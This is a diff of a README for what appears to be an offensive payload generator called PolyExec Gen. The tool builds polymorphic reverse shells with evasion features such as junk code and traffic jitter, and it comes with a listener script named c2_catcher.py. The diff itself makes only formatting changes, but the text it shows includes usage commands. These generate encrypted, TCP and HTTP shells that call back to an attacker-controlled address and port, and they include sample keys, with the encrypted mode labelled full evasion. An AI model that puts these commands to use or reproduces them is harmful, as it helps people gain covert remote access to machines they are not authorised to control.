@@ -22,9 +22,6 @@ junk code<br>
 Traffic jitter<br>
 
 ---
-
-### PolyExec Gen Usage:
-
 ##### install requirements:
 
     pip install -r requirements.txt
@@ -33,7 +30,11 @@ Traffic jitter<br>
 
     chmod +x polyexecgen.py c2_catcher.py
 
-##### Encrypted shell -- full evasion:
+### PolyExec Gen Usage:
+
+
+
+##### Encrypted shell - full evasion:
 
     ./polyexecgen.py -t 192.168.1.5 -p 6969 -m encrypted -k myg00dpassw0rd
     
@@ -41,7 +42,7 @@ Traffic jitter<br>
 
     ./polyexecgen.py -t 192.168.1.5 -p 6969 -m tcp
     
-##### HTTP --  web traffic:
+##### HTTP -  web traffic:
 
     ./polyexecgen.py -t http://192.168.1.5:6969/shell -m http -k myk3y
     
